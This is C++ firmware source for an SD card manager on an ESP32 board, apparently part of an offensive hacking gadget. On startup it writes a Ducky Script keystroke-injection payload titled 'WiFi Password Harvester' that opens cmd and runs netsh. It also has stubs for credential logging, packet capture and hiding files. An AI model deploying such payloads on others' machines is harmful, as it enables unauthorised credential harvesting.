#include "SDCardManager.h"
#include <SD.h>
#include <SPI.h>
#include <esp_log.h>

static const char* TAG = "SDCardManager";

// Constructor
SDCardManager::SDCardManager() : initialized(false), mounted(false), totalSpace(0), usedSpace(0), spi(nullptr) {
    memset(encryptionKey, 0, sizeof(encryptionKey));
}

// Destructor
SDCardManager::~SDCardManager() {
    if (initialized) {
        unmount();
    }
    if (spi) {
        delete spi;
    }
}

// Initialize with specific CS pin
bool SDCardManager::begin(int csPin) {
    if (initialized) return true;
    
    ESP_LOGI(TAG, "Initializing SD card on CS pin %d", csPin);
    
    // Configure SPI for Waveshare ESP32-S3-LCD-1.47
    spi = new SPIClass(HSPI);
    spi->begin(14, 16, 15, csPin); // SCK, MISO, MOSI, CS
    
    // Set slower SPI frequency for initialization (10MHz)
    spi->setFrequency(10000000);
    
    // Try multiple times with delays
    for (int attempt = 0; attempt < 3; attempt++) {
        ESP_LOGI(TAG, "SD card init attempt %d", attempt + 1);
        if (SD.begin(csPin, *spi)) {
            ESP_LOGI(TAG, "SD card initialized on attempt %d", attempt + 1);
            break;
        }
        delay(500);
    }
    
    if (!SD.begin(csPin, *spi)) {
        ESP_LOGE(TAG, "SD card initialization failed after 3 attempts!");
        delete spi;
        spi = nullptr;
        return false;
    }
    
    uint8_t cardType = SD.cardType();
    if (cardType == CARD_NONE) {
        ESP_LOGE(TAG, "No SD card attached");
        return false;
    }
    
    totalSpace = SD.totalBytes();
    usedSpace = SD.usedBytes();
    
    ESP_LOGI(TAG, "SD Card initialized. Size: %llu MB", totalSpace / (1024 * 1024));
    
    // Create directory structure
    ensureDirectory("/mct2032");
    ensureDirectory("/mct2032/payloads");
    ensureDirectory("/mct2032/payloads/windows");
    ensureDirectory("/mct2032/payloads/macos");
    ensureDirectory("/mct2032/payloads/linux");
    ensureDirectory("/mct2032/logs");
    ensureDirectory("/mct2032/captures");
    
    initialized = true;
    mounted = true;
    
    // Create default Ducky Script payloads
    const char* wifiHarvest = 
        "REM Windows WiFi Password Harvester\n"
        "DELAY 1000\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING cmd\n"
        "ENTER\n"
        "DELAY 1000\n"
        "STRING for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr /c:\"All User Profile\"') do @echo %a\n"
        "ENTER\n";
    
    savePayload("windows", "wifi_harvest.txt", wifiHarvest);
    
    return true;
}

// Initialize (calls begin with default pin)
bool SDCardManager::init() {
    return begin(21); // Default CS pin for Waveshare
}

// Mount SD card
bool SDCardManager::mount() {
    if (!initialized) return false;
    mounted = true;
    return true;
}

// Unmount SD card
void SDCardManager::unmount() {
    if (mounted) {
        SD.end();
        mounted = false;
    }
}

// Helper functions
String SDCardManager::getTimestamp() {
    return String(millis());
}

String SDCardManager::sanitizeFilename(String filename) {
    filename.replace("/", "_");
    filename.replace("\\", "_");
    filename.replace(":", "_");
    return filename;
}

bool SDCardManager::ensureDirectory(const char* path) {
    if (!SD.exists(path)) {
        return SD.mkdir(path);
    }
    return true;
}

// Space management
uint64_t SDCardManager::getTotalSpace() {
    return initialized ? SD.totalBytes() : 0;
}

uint64_t SDCardManager::getUsedSpace() {
    return initialized ? SD.usedBytes() : 0;
}

uint64_t SDCardManager::getFreeSpace() {
    return initialized ? (SD.totalBytes() - SD.usedBytes()) : 0;
}

bool SDCardManager::hasSpace(size_t bytes) {
    return getFreeSpace() > bytes;
}

// Directory operations
bool SDCardManager::createDirectory(const char* path) {
    if (!initialized) return false;
    return SD.mkdir(path);
}

bool SDCardManager::removeDirectory(const char* path) {
    if (!initialized) return false;
    return SD.rmdir(path);
}

std::vector<String> SDCardManager::listDirectory(const char* path) {
    std::vector<String> files;
    if (!initialized) return files;
    
    File dir = SD.open(path);
    if (!dir || !dir.isDirectory()) return files;
    
    File file = dir.openNextFile();
    while (file) {
        files.push_back(String(file.name()));
        file = dir.openNextFile();
    }
    
    return files;
}

// File operations
bool SDCardManager::writeFile(const char* path, const uint8_t* data, size_t len) {
    if (!initialized) return false;
    
    File file = SD.open(path, FILE_WRITE);
    if (!file) return false;
    
    size_t written = file.write(data, len);
    file.close();
    return written == len;
}

bool SDCardManager::appendFile(const char* path, const uint8_t* data, size_t len) {
    if (!initialized) return false;
    
    File file = SD.open(path, FILE_APPEND);
    if (!file) return false;
    
    size_t written = file.write(data, len);
    file.close();
    return written == len;
}

bool SDCardManager::readFile(const char* path, uint8_t* buffer, size_t maxLen) {
    if (!initialized) return false;
    
    File file = SD.open(path, FILE_READ);
    if (!file) return false;
    
    size_t bytesRead = file.read(buffer, maxLen);
    file.close();
    return bytesRead > 0;
}

bool SDCardManager::deleteFile(const char* path) {
    if (!initialized) return false;
    return SD.remove(path);
}

bool SDCardManager::fileExists(const char* path) {
    if (!initialized) return false;
    return SD.exists(path);
}

size_t SDCardManager::getFileSize(const char* path) {
    if (!initialized) return 0;
    
    File file = SD.open(path, FILE_READ);
    if (!file) return 0;
    
    size_t size = file.size();
    file.close();
    return size;
}

// Payload management
String SDCardManager::loadPayload(const char* os, const char* payloadName) {
    if (!initialized) return "";
    
    String path = String("/mct2032/payloads/") + os + "/" + payloadName;
    
    File file = SD.open(path, FILE_READ);
    if (!file) {
        ESP_LOGE(TAG, "Failed to open payload: %s", path.c_str());
        return "";
    }
    
    String content = file.readString();
    file.close();
    
    ESP_LOGI(TAG, "Loaded payload %s (%d bytes)", payloadName, content.length());
    return content;
}

bool SDCardManager::savePayload(const char* os, const char* payloadName, const char* content) {
    if (!initialized) return false;
    
    String dir = String("/mct2032/payloads/") + os;
    ensureDirectory(dir.c_str());
    
    String path = dir + "/" + payloadName;
    File file = SD.open(path, FILE_WRITE);
    if (!file) {
        ESP_LOGE(TAG, "Failed to create payload: %s", path.c_str());
        return false;
    }
    
    size_t written = file.print(content);
    file.close();
    
    ESP_LOGI(TAG, "Saved payload %s (%d bytes)", payloadName, written);
    return written > 0;
}

std::vector<String> SDCardManager::listPayloads(const char* os) {
    std::vector<String> payloads;
    if (!initialized) return payloads;
    
    String path = String("/mct2032/payloads/");
    if (os) path += os;
    
    return listDirectory(path.c_str());
}

// Data logging
bool SDCardManager::logWiFiScan(const JsonDocument& scanData) {
    if (!initialized) return false;
    
    String filename = "/mct2032/logs/wifi_scan_" + getTimestamp() + ".json";
    
    File file = SD.open(filename, FILE_WRITE);
    if (!file) return false;
    
    serializeJson(scanData, file);
    file.close();
    return true;
}

// Stub implementations for remaining methods
bool SDCardManager::logNetworkScan(const JsonDocument& networkData) { return false; }
bool SDCardManager::logCredentials(const String& credentials, bool encrypt) { return false; }
bool SDCardManager::logPacketCapture(const uint8_t* packet, size_t len) { return false; }
File SDCardManager::startPCAPCapture(const char* filename) { return File(); }
bool SDCardManager::writePCAPPacket(File& pcapFile, const uint8_t* packet, size_t len, uint32_t timestamp) { return false; }
void SDCardManager::closePCAPCapture(File& pcapFile) {}
std::vector<String> SDCardManager::listPlugins() { return std::vector<String>(); }
String SDCardManager::loadPlugin(const char* pluginName) { return ""; }
bool SDCardManager::executePlugin(const char* pluginName) { return false; }
bool SDCardManager::saveConfig(const char* configName, const JsonDocument& config) { return false; }
bool SDCardManager::loadConfig(const char* configName, JsonDocument& config) { return false; }
bool SDCardManager::encryptData(const uint8_t* data, size_t len, uint8_t* output) { return false; }
bool SDCardManager::decryptData(const uint8_t* data, size_t len, uint8_t* output) { return false; }
bool SDCardManager::secureDelete(const char* path) { return deleteFile(path); }
bool SDCardManager::loadWordlist(const char* name, std::vector<String>& words) { return false; }
bool SDCardManager::saveWordlist(const char* name, const std::vector<String>& words) { return false; }
bool SDCardManager::hideFile(const char* path) { return false; }